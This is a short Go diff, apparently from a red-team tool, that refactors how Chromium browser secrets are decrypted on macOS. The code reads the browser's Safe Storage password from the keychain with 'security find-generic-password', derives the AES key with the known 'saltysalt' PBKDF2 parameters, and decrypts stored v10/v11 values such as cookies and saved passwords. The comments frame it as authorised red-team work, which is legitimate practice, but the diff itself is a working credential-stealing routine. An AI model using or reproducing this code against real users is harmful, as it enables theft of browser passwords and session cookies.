@@ -37,23 +37,24 @@ func keychainServiceName(browser string) string {
 // retrieve the keychain-stored Safe Storage password.
 // NOTE: this prompts the user for keychain access on first run — acceptable
 // for red team scenarios per spec.
-func getChromiumMasterKey(profileDir, browserName string) ([]byte, error) {
+func getChromiumMasterKey(profileDir, browserName string) (*chromiumKeys, error) {
 	svc := keychainServiceName(browserName)
 	out, err := exec.Command("security", "find-generic-password", "-wa", svc).Output()
 	if err != nil {
 		return nil, fmt.Errorf("%w: security find-generic-password %q", err, svc)
 	}
 	password := strings.TrimSpace(string(out))
-	return pbkdf2.Key([]byte(password), []byte("saltysalt"), 1003, 16, sha1.New), nil
+	return &chromiumKeys{V10: pbkdf2.Key([]byte(password), []byte("saltysalt"), 1003, 16, sha1.New)}, nil
 }
 
-func chromiumDecryptValue(blob, key []byte) ([]byte, error) {
+func chromiumDecryptValue(blob []byte, keys *chromiumKeys) ([]byte, error) {
 	if len(blob) < 3 {
 		return nil, fmt.Errorf("blob too short")
 	}
 	if bytes.Equal(blob[:3], []byte("v10")) || bytes.Equal(blob[:3], []byte("v11")) {
 		blob = blob[3:]
 	}
+	key := keys.V10
 	block, err := aes.NewCipher(key)
 	if err != nil {
 		return nil, err
